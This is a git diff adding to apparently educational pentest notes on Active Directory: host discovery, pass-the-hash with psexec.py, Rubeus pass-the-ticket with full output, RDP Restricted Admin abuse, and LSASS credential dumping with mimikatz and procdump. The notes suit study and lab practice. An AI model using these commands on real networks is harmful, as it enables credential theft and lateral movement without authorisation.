@@ -338,4 +338,103 @@ secretsdump.py 'contoso.local/Administrator@192.168.100.2' -just-dc-user krbtgt
 
 **How to discover Windows computers in a domain or network?**
 
-* We can scan the network and perform a NetBIOS scan by using a tool like [nbtscan](http://www.unixwiz.net/tools/nbtscan.html) or nmap [nbtstat](https://nmap.org/nsedoc/scripts/nbstat.html) script.
+* ([NetBIOS name service](https://zer1t0.gitlab.io/posts/attacking\_ad/#netbios-name-service) listens in the port 137) We can scan the network and perform a NetBIOS scan by using a tool like [nbtscan](http://www.unixwiz.net/tools/nbtscan.html) or nmap [nbtstat](https://nmap.org/nsedoc/scripts/nbstat.html) script.
+* ([SMB](https://zer1t0.gitlab.io/posts/attacking\_ad/#smb) listens in the port 445) We can take advantage of the NTLM authentication negotiation to retrieve the machine name. You can perform an scan with [ntlm-info](https://github.com/Zer1t0/ntlm-info) or nmap [smb-os-discovery](https://nmap.org/nsedoc/scripts/smb-os-discovery.html) script.
+
+#### How to connect with RPC/SMB
+
+* If you have port 445 open, you can use tools such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) and the impacket examples [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py), [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) ([wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) will also need the port 135)
+* You can also perform Pass-the-hash with the NT or LM hash directly with impacket tools:
+
+```
+psexec.py contoso.local/Anakin@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
+```
+
+* With the PsExec tool, [inject the NT hash in the Windows session with mimikatz](https://stealthbits.com/blog/passing-the-hash-with-mimikatz/).
+
+With those techniques we connect via NTLM auth, but by default Kerberos is used and we would need to provide a kerberos tickets with those tools
+
+* in Windows we will need to [inject the ticket in the session](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#using-ticket-in-windows) by using [mimikatz](https://github.com/gentilkiwi/mimikatz) or [Rubeus](https://github.com/GhostPack/Rubeus).
+
+Windows and linux use different ticket formay that we can convert using [ticket\_converter](https://github.com/Zer1t0/ticket\_converter) or [cerbero](https://github.com/Zer1t0/cerbero#convert).
+
+#### How to use **Powershell Remoting to connect**
+
+to connect to a Windows machine and get a Powershell session in the remote machine
+
+* From windows we need to use [CmdLets and parameters](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.1)
+  * if we have a Kerberos ticket or a NT hash, we will need to inject them by using [Rubeus](https://github.com/GhostPack/Rubeus) or [mimikatz](https://github.com/gentilkiwi/mimikatz).
+
+```
+.\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.6.1
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: b73fdfe10e87b4ca5c0d957f81de6863
+[*] Building AS-REQ (w/ preauth) for: 'contoso.local\Administrator'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFQjCCBT6gAwIBBaEDAgEWooIETzCCBEthggRHMIIEQ6ADAgEFoQ8bDUNPTlRPU08uTE9DQUyiIjAg
+      oAMCAQKhGTAXGwZrcmJ0Z3QbDWNvbnRvc28ubG9jYWyjggQFMIIEAaADAgESoQMCAQKiggPzBIID7xK3
+      <!--stripped-->
+      ERgPMjAyMTA1MDgwMjQzMjZapxEYDzIwMjEwNTE0MTY0MzI2WqgPGw1DT05UT1NPLkxPQ0FMqSIwIKAD
+      AgECoRkwFxsGa3JidGd0Gw1jb250b3NvLmxvY2Fs
+[+] Ticket successfully imported!
+
+  ServiceName           :  krbtgt/contoso.local
+  ServiceRealm          :  CONTOSO.LOCAL
+  UserName              :  Administrator
+  UserRealm             :  CONTOSO.LOCAL
+  StartTime             :  07/05/2021 18:43:26
+  EndTime               :  08/05/2021 04:43:26
+  RenewTill             :  14/05/2021 18:43:26
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType               :  rc4_hmac
+  Base64(key)           :  95a1NmgYXwOmiyCa3qlplA==
+
+PS C:\> Enter-PSSession -ComputerName dc01
+[dc01]: PS C:\Users\Administrator\Documents> whoami
+contoso\administrator
+[dc01]: PS C:\Users\Administrator\Documents> hostname
+dc01
+[dc01]:
+```
+
+* From a Linux machine you can use [evil-winrm](https://github.com/Hackplayers/evil-winrm).
+
+{% content-ref url="../../../interacting-with-protocols-and-tools/tools/winrm.md" %}
+[winrm.md](../../../interacting-with-protocols-and-tools/tools/winrm.md)
+{% endcontent-ref %}
+
+#### How to connect with RDP
+
+* From windows we can use [mstsc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
+* From Linux we can use [rdesktop](http://www.rdesktop.org/), [freerdp](https://www.freerdp.com/) or [remmina](https://remmina.org/)
+  * Unlike RPC/SMB, RDP transmits the password in plain text and allows the remote computer to cache the user's credentials. it enables the user to log in to the remote system without having to enter their password again at each connection thus simulating the experience of being physically logged into their own machine. This makes it impossible to use pass-the-hash attacks
+  * But there is a mode called Restricted Admin, when enabled, you don't send plain text so it's then possible to perform pass the hash connections.
+    * From Linux, you can [use freerdp to perform a Pass-The-Hash with RDP](https://www.kali.org/blog/passing-hash-remote-desktop/)
+    * And from Windows you can [inject a NT hash or Kerberos ticket with mimikatz or Rubeus and then use `mstsc.exe /restrictedadmin`](https://shellz.club/pass-the-hash-with-rdp-in-2019/)
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>Restricted admin enabled</p></figcaption></figure>
+
+#### **Windows computers credentials**
+
+#### **Explain LSASS credentials**
+
+* On windows machine -> common place to find creds -> LSASS Process (lsass.exe) in charge of user auth
+* when user logs in -> credentials cached in lsass process in order to use SSO -> credentials caches by some [SSPs](https://zer1t0.gitlab.io/posts/attacking\_ad/#windows-ssps) (Security Support Providers) each one uses different auth methods, example:
+  * The [Kerberos SSP](https://zer1t0.gitlab.io/posts/attacking\_ad/#kerberos-ssp)
+  * The [Digest SSP](https://zer1t0.gitlab.io/posts/attacking\_ad/#digest-ssp)
+  * The [NTLMSSP](https://zer1t0.gitlab.io/posts/attacking\_ad/#ntlm-ssp)
+
+We can extract LSASS credentials using [mimikatz](https://github.com/gentilkiwi/mimikatz). We can launch mimikatz directly in the target machine, or [dumping the LSASS memory](https://www.deepinstinct.com/2021/01/24/lsass-memory-dumps-are-stealthier-than-ever-before/) with some tool like [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [comsvcs.dll](https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/) or [werfault.exe](https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/) and then process the generated memory dump with mimikatz or [pypikatz](https://github.com/skelsec/pypykatz). can also to use [lsassy](https://github.com/Hackndo/lsassy) to read a dump remotely avoiding to have to download the entire memory dump, that can take several megabytes.
